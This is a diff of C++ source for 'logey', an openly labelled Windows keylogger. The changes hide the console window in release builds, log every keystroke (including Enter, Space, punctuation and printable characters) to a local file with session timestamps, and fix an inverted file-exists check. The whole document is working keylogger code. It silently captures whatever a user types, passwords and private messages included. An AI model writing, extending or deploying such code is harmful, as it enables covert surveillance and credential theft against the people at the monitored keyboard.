@@ -4,7 +4,7 @@
 int main() {
 #ifndef DEBUG
 	FreeConsole(); // Hides the console
-#endif // DEBUG
+#endif
 
 	std::string filename = "logey.log"; // The name of the log file
 
@@ -30,13 +30,13 @@ void captureKey(int key, std::string filename) {
 
 	switch (key) {
 	case VK_RETURN:
-		description = "{ENTER}\n";
+		description = "\n";
 		break;
 	case VK_SHIFT:
 		description = "{SHIFT}";
 		break;
 	case VK_SPACE:
-		description = "{SPACE}";
+		description = " ";
 		break;
 	case VK_BACK:
 		description = "{BACKSPACE}";
@@ -55,6 +55,13 @@ void captureKey(int key, std::string filename) {
 		break;
 	case VK_DELETE:
 		description = "{DEL}";
+		break;
+	case 190:
+		description = ".";
+		break;
+	case 188:
+		description = ",";
+		break;
 	default:
 		char c = '\0';
 		if (key >= 33 && key <= 126) {
@@ -68,19 +75,20 @@ void captureKey(int key, std::string filename) {
 	}
 
 #ifdef DEBUG // Only in debug mode
-	std::clog << description; // Text is written to the console. (Yes it improves performance too)
+	std::clog << description; // Write text to console while debugging
 #endif
-	file << description; // But in all cases Text is written to the log file
+	file << description; // Write text to log file
 	file.close(); // Close the log file as soon as possible
 }
 
 void createFileHeader(std::string filename) {
-	if (fexists(filename)) {
+	if (!fileExists(filename)) {
 		std::ofstream file(filename, std::ios_base::app);
-		file << "\n\n--------------------------------" << std::endl;
+		file << "--------------------------------" << std::endl;
 		file << "logey -- A keylogger for Windows" << std::endl;
 		file << "author: exler" << std::endl;
 		file << "license: MIT" << std::endl;
+		file << "source: https://github.com/exler/logey" << std::endl;
 		file << "--------------------------------" << std::endl;
 		file.close(); // Close the log file as soon as possible
 	}
@@ -94,16 +102,18 @@ void createTimeStamp(std::string filename) {
 	std::time_t timestamp = std::chrono::system_clock::to_time_t(time);
 	ctime_s(str, sizeof(str), &timestamp);
 
+	file << "\n--------------------------------" << std::endl;
 	file << "Session timestamp: " << str;
-	file << std::endl;
+	file << "--------------------------------" << std::endl;
 
 	file.close(); // Close the log file as soon as possible
 }
 
-bool fexists(std::string filename) {
+bool fileExists(std::string filename) {
 	if (std::ifstream(filename)) {
-		return false;
-	} else {
 		return true;
+	}
+	else {
+		return false;
 	}
 }
